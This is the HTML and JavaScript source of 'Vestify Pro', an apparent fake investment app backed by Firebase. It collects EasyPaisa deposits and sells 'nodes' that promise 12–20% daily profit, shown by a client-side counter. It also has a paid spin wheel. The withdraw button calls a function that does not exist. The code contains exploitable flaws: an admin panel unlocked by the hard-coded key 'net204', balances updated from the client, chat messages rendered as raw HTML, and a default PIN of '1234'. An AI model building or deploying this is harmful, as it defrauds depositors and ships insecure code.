<html lang="ur" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-auth-compat.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <title>Vestify Pro - Fixed Edition</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;700;800&display=swap');
        body { font-family: 'Plus Jakarta Sans', sans-serif; background: #0B0E11; color: white; margin: 0; overflow-x: hidden; text-align: right; }
        .glass { background: rgba(30, 35, 41, 0.9); backdrop-filter: blur(20px); border: 1px solid rgba(255,255,255,0.05); border-radius: 24px; }
        .trading-btn { background: #F3BA2F; color: black; font-weight: 800; border-radius: 16px; transition: 0.3s; box-shadow: 0 4px 15px rgba(243, 186, 47, 0.2); }
        .page { display: none; padding: 15px; animation: fadeIn 0.4s ease; padding-bottom: 100px; }
        .active-page { display: block; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(8px); } to { opacity: 1; } }
        .nav-bar { position: fixed; bottom: 0; width: 100%; height: 75px; background: #161a1e; border-top: 1px solid rgba(255,255,255,0.08); display: flex; justify-content: space-around; align-items: center; flex-direction: row-reverse; z-index: 2000; }
        .nav-active { color: #F3BA2F; }
        #wheel-svg { width: 280px; height: 280px; transition: transform 5s cubic-bezier(0.1, 0, 0.1, 1); }
    </style>
</head>
<body>

    <header class="p-4 flex justify-between items-center sticky top-0 bg-[#0B0E11]/95 z-[1001]">
        <div class="flex items-center gap-3 flex-row-reverse">
            <div onclick="handleAdminTap()" class="w-10 h-10 rounded-full border-2 border-yellow-500/30 overflow-hidden bg-white/5 flex items-center justify-center">
                <img id="u-img" src="" class="w-full h-full hidden">
                <i id="u-icon" class="fa-solid fa-user text-yellow-500"></i>
            </div>
            <div class="text-right">
                <p id="u-name" class="text-[10px] font-bold opacity-50 uppercase">Syncing...</p>
                <p class="text-xs font-black text-yellow-500">VESTIFY PRO</p>
            </div>
        </div>
        <button onclick="toggleChat()" class="bg-white/5 w-10 h-10 rounded-full flex items-center justify-center">
            <i class="fa-solid fa-comment-dots text-yellow-500"></i>
        </button>
    </header>

    <main>
        <div id="p-home" class="page active-page">
            <div class="glass p-6 mb-6 text-center">
                <p class="text-[10px] font-bold opacity-40 mb-2 uppercase">Account Balance</p>
                <h1 id="v-bal" class="text-5xl font-black italic mb-2 tracking-tighter">₨ 0.00</h1>
                <p class="text-[10px] text-green-500 font-bold mb-6 italic">+₨ <span id="profit-counter">0.0000</span> Profit Live</p>
                <div class="grid grid-cols-2 gap-3">
                    <button onclick="showPage('deposit')" class="trading-btn py-4 text-xs">DEPOSIT</button>
                    <button onclick="showPage('withdraw')" class="bg-white/5 py-4 rounded-2xl text-xs font-bold">WITHDRAW</button>
                </div>
            </div>

            <div class="flex gap-4 mb-4 border-b border-white/5 pb-2">
                <button id="btn-n" onclick="renderNodes('normal')" class="text-sm font-bold text-yellow-500">Market Nodes</button>
                <button id="btn-s" onclick="renderNodes('special')" class="text-sm font-bold opacity-30">VIP Access</button>
            </div>
            <div id="nodes-grid" class="space-y-4"></div>
        </div>

        <div id="p-history" class="page">
            <h2 class="text-xl font-black mb-6 text-yellow-500">Trade History</h2>
            <div id="history-list" class="space-y-3"></div>
        </div>

        <div id="p-spin" class="page text-center">
            <h2 class="text-xl font-black mb-10 text-yellow-500">LUCKY SPIN</h2>
            <div class="relative flex justify-center mb-10">
                <i class="fa-solid fa-caret-down absolute -top-4 text-3xl text-yellow-500 z-10"></i>
                <svg id="wheel-svg" viewBox="0 0 100 100">
                    <circle cx="50" cy="50" r="48" fill="#1E2329" stroke="#F3BA2F" stroke-width="2"/>
                    <path d="M50,50 L50,2 A48,48 0 0,1 84,16 Z" fill="#F3BA2F"/><path d="M50,50 L84,16 A48,48 0 0,1 98,50 Z" fill="#2B3139"/>
                    <path d="M50,50 L98,50 A48,48 0 0,1 84,84 Z" fill="#F3BA2F"/><path d="M50,50 L84,84 A48,48 0 0,1 50,98 Z" fill="#2B3139"/>
                    <path d="M50,50 L50,98 A48,48 0 0,1 16,84 Z" fill="#F3BA2F"/><path d="M50,50 L16,84 A48,48 0 0,1 2,50 Z" fill="#2B3139"/>
                    <path d="M50,50 L2,50 A48,48 0 0,1 16,16 Z" fill="#F3BA2F"/><path d="M50,50 L16,16 A48,48 0 0,1 50,2 Z" fill="#2B3139"/>
                </svg>
            </div>
            <div id="timer-box" class="mb-6 hidden">
                <span id="spin-timer" class="bg-yellow-500/10 text-yellow-500 px-6 py-2 rounded-full font-bold text-xs border border-yellow-500/20">00:00:00</span>
            </div>
            <button id="spin-btn" onclick="runSpin()" class="w-full trading-btn py-5 text-sm uppercase">Spin (₨ 50)</button>
        </div>

        <div id="chat-window" class="hidden fixed inset-0 z-[3000] bg-[#0B0E11] flex flex-col">
            <div class="p-4 border-b border-white/5 flex justify-between items-center">
                <h3 class="font-black text-yellow-500 uppercase">Live Community</h3>
                <button onclick="toggleChat()"><i class="fa-solid fa-xmark text-xl"></i></button>
            </div>
            <div id="chat-msgs" class="flex-1 overflow-y-auto p-4 space-y-4"></div>
            <div class="p-4 bg-[#1E2329] flex gap-2">
                <input id="chat-in" type="text" placeholder="Message..." class="flex-1 bg-white/5 p-4 rounded-2xl outline-none text-sm">
                <button onclick="sendMsg()" class="bg-yellow-500 text-black w-14 h-14 rounded-2xl flex items-center justify-center"><i class="fa-solid fa-paper-plane"></i></button>
            </div>
        </div>

        <div id="p-deposit" class="page">
            <h2 class="text-xl font-black mb-6">Deposit</h2>
            <div class="glass p-6 space-y-4">
                <div class="bg-yellow-500/10 p-4 rounded-xl text-center border border-yellow-500/20">
                    <p class="text-[10px] opacity-50 uppercase">Official EasyPaisa</p>
                    <p class="text-xl font-black text-yellow-500">03379827882</p>
                </div>
                <input id="d-amt" type="number" placeholder="Amount" class="w-full bg-white/5 p-4 rounded-xl outline-none border border-white/5">
                <input id="d-tid" type="text" placeholder="Transaction ID (TID)" class="w-full bg-white/5 p-4 rounded-xl outline-none border border-white/5">
                <button onclick="reqTx('Deposit')" class="w-full trading-btn py-4 text-xs font-black">SUBMIT REQUEST</button>
            </div>
        </div>

        <div id="p-withdraw" class="page">
            <h2 class="text-xl font-black mb-6">Withdraw</h2>
            <div class="glass p-6 space-y-4">
                <input id="w-num" type="text" placeholder="Number" class="w-full bg-white/5 p-4 rounded-xl outline-none border border-white/5">
                <input id="w-amt" type="number" placeholder="Amount" class="w-full bg-white/5 p-4 rounded-xl outline-none border border-white/5">
                <input id="w-pin" type="password" maxlength="4" placeholder="PIN" class="w-full bg-white/5 p-4 rounded-xl text-center tracking-widest outline-none border border-white/5">
                <button onclick="handleW()" class="w-full trading-btn py-4 text-xs font-black">REQUEST WITHDRAWAL</button>
            </div>
        </div>
    </main>

    <div id="admin-ui" class="hidden fixed inset-0 z-[5000] bg-black p-6 overflow-y-auto">
        <div class="flex justify-between items-center mb-10">
            <h2 class="text-xl font-black text-yellow-500">ADMIN CONTROL</h2>
            <button onclick="closeAdmin()" class="bg-red-600 px-5 py-2 rounded-xl text-xs font-black">EXIT</button>
        </div>
        <div id="adm-list" class="space-y-4"></div>
    </div>

    <nav class="nav-bar">
        <button onclick="showPage('home')" class="nav-item nav-active"><i class="fa-solid fa-chart-line text-lg"></i><p class="text-[8px] font-bold">MARKET</p></button>
        <button onclick="showPage('spin')" class="nav-item"><i class="fa-solid fa-dharmachakra text-lg opacity-40"></i><p class="text-[8px] font-bold opacity-40">SPIN</p></button>
        <button onclick="showPage('history')" class="nav-item"><i class="fa-solid fa-receipt text-lg opacity-40"></i><p class="text-[8px] font-bold opacity-40">HISTORY</p></button>
    </nav>

    <script>
        const firebaseConfig = { apiKey: "AIzaSyC9ofJ1KxRXHnxilpU9gyI87D3BSOZ9v1g", authDomain: "vestify-991f2.firebaseapp.com", projectId: "vestify-991f2", storageBucket: "vestify-991f2.firebasestorage.app", messagingSenderId: "799007097733", appId: "1:799007097733:web:ed3b35b6c4e51dc2e7baec" };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.firestore(), auth = firebase.auth();
        let userObj = null, currRot = 0, tapCount = 0;

        auth.onAuthStateChanged(async user => {
            if(user) {
                document.getElementById('u-name').innerText = user.displayName;
                if(user.photoURL) { 
                    document.getElementById('u-img').src = user.photoURL; 
                    document.getElementById('u-img').classList.remove('hidden');
                    document.getElementById('u-icon').classList.add('hidden');
                }
                syncData(user.displayName);
                renderNodes('normal');
                loadChat();
                loadHistory(user.displayName);
            } else { auth.signInWithPopup(new firebase.auth.GoogleAuthProvider()); }
        });

        function syncData(name) {
            db.collection("users").doc(name).onSnapshot(doc => {
                userObj = doc.data() || { balance: 0, lastSpin: 0, dailyProfit: 0, walletPin: "1234" };
                document.getElementById('v-bal').innerText = "₨ " + (userObj.balance || 0).toLocaleString();
                startProfitCounter(userObj.dailyProfit || 0);
            });
        }

        function loadHistory(name) {
            db.collection("txs").where("user","==",name).orderBy("time","desc").onSnapshot(s => {
                let h = "";
                s.forEach(doc => {
                    const d = doc.data();
                    const color = d.status === "Approved" ? "text-green-500" : "text-yellow-500";
                    h += `<div class="glass p-5 flex justify-between items-center border-l-4 border-yellow-500">
                        <div><p class="text-xs font-black uppercase">${d.type}</p><p class="text-[8px] opacity-40">${new Date(d.time).toLocaleString()}</p></div>
                        <div class="text-left"><p class="text-sm font-black">₨ ${d.amount.toLocaleString()}</p><p class="text-[9px] ${color} font-bold">${d.status}</p></div>
                    </div>`;
                });
                document.getElementById('history-list').innerHTML = h || `<p class="text-center opacity-30 text-xs mt-10">No transactions found</p>`;
            });
        }

        async function reqTx(type) {
            const amt = Number(document.getElementById('d-amt').value), tid = document.getElementById('d-tid').value;
            if(!amt || !tid) return alert("Fill all fields");
            await db.collection("txs").add({ user: auth.currentUser.displayName, amount: amt, tid: tid, type: type, status: "Pending", time: Date.now() });
            alert("Request Sent!");
            showPage('home');
        }

        async function buyNode(c, d) {
            if(userObj.balance < c) return alert("Low Balance!");
            if(confirm("Activate this Node?")) {
                await db.collection("users").doc(auth.currentUser.displayName).update({ balance: firebase.firestore.FieldValue.increment(-c), dailyProfit: firebase.firestore.FieldValue.increment(d) });
                await db.collection("txs").add({ user: auth.currentUser.displayName, amount: c, type: "Node Activation", status: "Approved", time: Date.now() });
                alert("Activated!");
            }
        }

        function runSpin() {
            const now = Date.now(), last = userObj.lastSpin || 0, isFree = (now - last) > 86400000;
            if(!isFree && userObj.balance < 50) return alert("Need ₨ 50!");
            const prizes = [100, 10, 50, 5, 20, 2, 10, 2]; const idx = Math.floor(Math.random()*8);
            currRot += 3600 + (idx * 45); document.getElementById('wheel-svg').style.transform = `rotate(${currRot}deg)`;
            setTimeout(async () => {
                await db.collection("users").doc(auth.currentUser.displayName).update({ balance: firebase.firestore.FieldValue.increment(prizes[idx] - (isFree?0:50)), lastSpin: isFree?now:last });
                await db.collection("txs").add({ user: auth.currentUser.displayName, amount: prizes[idx], type: "Spin Win", status: "Approved", time: Date.now() });
                alert(`You Won ₨ ${prizes[idx]}!`);
            }, 5000);
        }

        function renderNodes(type) {
            let h = ""; let start = type === 'normal' ? 200 : 5000;
            for(let i=1; i<=6; i++) {
                let cost = start + (i * (type === 'normal' ? 500 : 5000));
                let daily = Math.floor(cost * (type === 'normal' ? 0.12 : 0.20));
                h += `<div class="glass p-5 border-r-4 border-yellow-500 flex justify-between items-center">
                    <div><p class="text-[9px] text-yellow-500 font-bold uppercase">Node Elite v.${i}</p><h3 class="text-xl font-black">₨ ${cost.toLocaleString()}</h3></div>
                    <button onclick="buyNode(${cost}, ${daily})" class="bg-white/5 px-6 py-3 rounded-xl text-[10px] font-black border border-white/5 hover:bg-yellow-500 hover:text-black transition">ACTIVATE</button>
                </div>`;
            }
            document.getElementById('nodes-grid').innerHTML = h;
            document.getElementById('btn-n').style.opacity = type === 'normal' ? '1' : '0.3';
            document.getElementById('btn-s').style.opacity = type === 'special' ? '1' : '0.3';
        }

        function startProfitCounter(d) {
            const sec = d / 86400;
            if(window.profitInt) clearInterval(window.profitInt);
            window.profitInt = setInterval(() => {
                let c = parseFloat(document.getElementById('profit-counter').innerText);
                document.getElementById('profit-counter').innerText = (c + sec).toFixed(4);
            }, 1000);
        }

        function handleAdminTap() { tapCount++; if(tapCount>=10) { if(prompt("Enter Key:")==="net204") loadAdmin(); tapCount=0; } }
        function loadAdmin() {
            document.getElementById('admin-ui').classList.remove('hidden');
            db.collection("txs").where("status","==","Pending").onSnapshot(s => {
                let h = ""; s.forEach(doc => {
                    const d = doc.data();
                    h += `<div class="glass p-5 mb-4 border-l-4 border-red-500"><p class="text-xs opacity-50">${d.user} (${d.tid || 'No TID'})</p><h2 class="text-2xl font-black">₨ ${d.amount.toLocaleString()}</h2><button onclick="approveTx('${doc.id}','${d.user}',${d.amount})" class="w-full bg-green-600 py-4 mt-4 rounded-2xl font-black text-xs">APPROVE NOW</button></div>`;
                });
                document.getElementById('adm-list').innerHTML = h || `<p class="text-center opacity-40 mt-10">No pending requests</p>`;
            });
        }
        async function approveTx(id, u, a) {
            await db.collection("txs").doc(id).update({status:"Approved"});
            await db.collection("users").doc(u).update({balance: firebase.firestore.FieldValue.increment(a)});
        }

        function showPage(p) {
            document.querySelectorAll('.page').forEach(pg => pg.classList.remove('active-page'));
            document.getElementById('p-'+p).classList.add('active-page');
            document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('nav-active'));
        }

        function toggleChat() { document.getElementById('chat-window').classList.toggle('hidden'); }
        async function sendMsg() {
            const m = document.getElementById('chat-in').value; if(!m) return;
            await db.collection("chats").add({ user: auth.currentUser.displayName, text: m, time: Date.now() });
            document.getElementById('chat-in').value = "";
        }
        function loadChat() {
            db.collection("chats").orderBy("time","asc").limitToLast(50).onSnapshot(s => {
                let h = ""; s.forEach(doc => {
                    const d = doc.data(); const isMe = d.user === auth.currentUser.displayName;
                    h += `<div class="flex ${isMe?'justify-start':'justify-end'}"><div class="${isMe?'bg-yellow-500 text-black':'bg-white/10 text-white'} p-4 rounded-3xl max-w-[85%] text-xs font-bold shadow-xl">${d.text}</div></div>`;
                });
                document.getElementById('chat-msgs').innerHTML = h;
                document.getElementById('chat-msgs').scrollTop = document.getElementById('chat-msgs').scrollHeight;
            });
        }
        function closeAdmin() { document.getElementById('admin-ui').classList.add('hidden'); }
        setInterval(() => {
            if(!userObj || !userObj.lastSpin) return;
            const diff = (userObj.lastSpin + 86400000) - Date.now();
            if(diff > 0) {
                document.getElementById('timer-box').classList.remove('hidden');
                const h = Math.floor(diff/3600000), m = Math.floor((diff%3600000)/60000), s = Math.floor((diff%60000)/1000);
                document.getElementById('spin-timer').innerText = `${h}:${m}:${s}`;
            } else document.getElementById('timer-box').classList.add('hidden');
        }, 1000);
    </script>
</body>
</html>
